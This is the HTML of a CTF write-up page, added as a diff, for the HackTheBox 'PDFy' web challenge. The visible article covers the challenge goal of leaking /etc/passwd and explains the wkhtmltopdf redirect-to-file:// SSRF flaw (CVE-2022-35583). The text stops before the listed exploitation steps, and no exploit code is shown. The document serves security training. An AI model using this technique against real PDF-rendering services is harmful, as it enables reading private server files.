@@ -1,0 +1,1591 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Personal collection of security notes, CTF writeups, and hacking techniques">
+      
+      
+        <meta name="author" content="Your Name">
+      
+      
+        <link rel="canonical" href="https://tryptoph.github.io/CTF-Writeups/web/pdfy/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../../pwn/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>PDFy - CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hackthebox-pdfy-web-challenge-complete-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="CTF Writeups" class="md-header__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PDFy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  Web Challenges
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../pwn/" class="md-tabs__link">
+          
+  
+  
+  Binary Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../reverse/" class="md-tabs__link">
+          
+  
+  
+  Reverse Engineering
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../crypto/" class="md-tabs__link">
+          
+  
+  
+  Cryptography
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../misc/" class="md-tabs__link">
+          
+  
+  
+  Misc
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../boxes/" class="md-tabs__link">
+          
+  
+  
+  Boxes
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CTF Writeups" class="md-nav__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Challenges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    PDFy
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    PDFy
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technical Background
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Background">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-is-wkhtmltopdf" class="md-nav__link">
+    <span class="md-ellipsis">
+      What is wkhtmltopdf?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability-cve-2022-35583" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerability (CVE-2022-35583)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analyzing-the-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analyzing the Application
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation Strategy
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detailed-exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detailed Exploitation Steps
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detailed Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-create-a-redirect-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Create a Redirect Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-expose-the-local-server-to-the-internet" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Expose the Local Server to the Internet
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-submit-the-malicious-url-to-pdfy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Submit the Malicious URL to PDFy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-pdfy-processes-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: PDFy Processes the Request
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-download-and-view-the-pdf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Download and View the PDF
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-explanation-of-the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technical Explanation of the Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alternative-exploitation-approaches" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alternative Exploitation Approaches
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Alternative Exploitation Approaches">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-php-if-available" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PHP (if available)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-iframes-also-effective" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using iframes (also effective)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation Recommendations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons Learned
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#appendix-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      Appendix: References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Binary Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Binary Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Reverse Engineering
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Reverse Engineering
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reverse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cryptography
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Cryptography
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Misc
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Boxes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Boxes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../boxes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technical Background
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Background">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-is-wkhtmltopdf" class="md-nav__link">
+    <span class="md-ellipsis">
+      What is wkhtmltopdf?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability-cve-2022-35583" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerability (CVE-2022-35583)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analyzing-the-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analyzing the Application
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation Strategy
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detailed-exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detailed Exploitation Steps
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detailed Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-create-a-redirect-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Create a Redirect Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-expose-the-local-server-to-the-internet" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Expose the Local Server to the Internet
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-submit-the-malicious-url-to-pdfy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Submit the Malicious URL to PDFy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-pdfy-processes-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: PDFy Processes the Request
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-download-and-view-the-pdf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Download and View the PDF
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-explanation-of-the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technical Explanation of the Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alternative-exploitation-approaches" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alternative Exploitation Approaches
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Alternative Exploitation Approaches">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-php-if-available" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PHP (if available)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-iframes-also-effective" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using iframes (also effective)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation Recommendations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons Learned
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#appendix-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      Appendix: References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="hackthebox-pdfy-web-challenge-complete-writeup">HackTheBox PDFy Web Challenge - Complete Writeup</h1>
+<p><img alt="Pasted image 20250513181036.png" src="../../assets/images/Pasted%20image%2020250513181036.png" /></p>
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p><strong>Name:</strong> PDFy<br />
+<strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Description:</strong></p>
+<blockquote>
+<p>Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content!<br />
+<strong>NOTE:</strong> Leak /etc/passwd to get the flag!</p>
+</blockquote>
+<h2 id="technical-background">Technical Background</h2>
+<h3 id="the-vulnerability">The Vulnerability</h3>
+<p>PDFy is vulnerable to Server-Side Request Forgery (SSRF) due to its utilization of the wkhtmltopdf library. The challenge explicitly tells us we need to leak the contents of <code>/etc/passwd</code> to get the flag, indicating this is likely an SSRF challenge.</p>
+<h3 id="what-is-wkhtmltopdf">What is wkhtmltopdf?</h3>
+<p>wkhtmltopdf is a command-line tool that renders HTML into PDF documents using the Qt WebKit rendering engine. It's commonly used in web applications that need to generate PDF reports or document conversions.</p>
+<p>you can see it in app by entering a wrong url : </p>
+<p><img alt="Pasted image 20250513180930.png" src="../../assets/images/Pasted%20image%2020250513180930.png" /></p>
+<h3 id="the-vulnerability-cve-2022-35583">The Vulnerability (CVE-2022-35583)</h3>
+<p>wkhtmltopdf has a known vulnerability (CVE-2022-35583) where it follows HTTP redirects to <code>file://</code> URIs without appropriate validation. This allows attackers to redirect requests to local files, which can lead to information disclosure.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
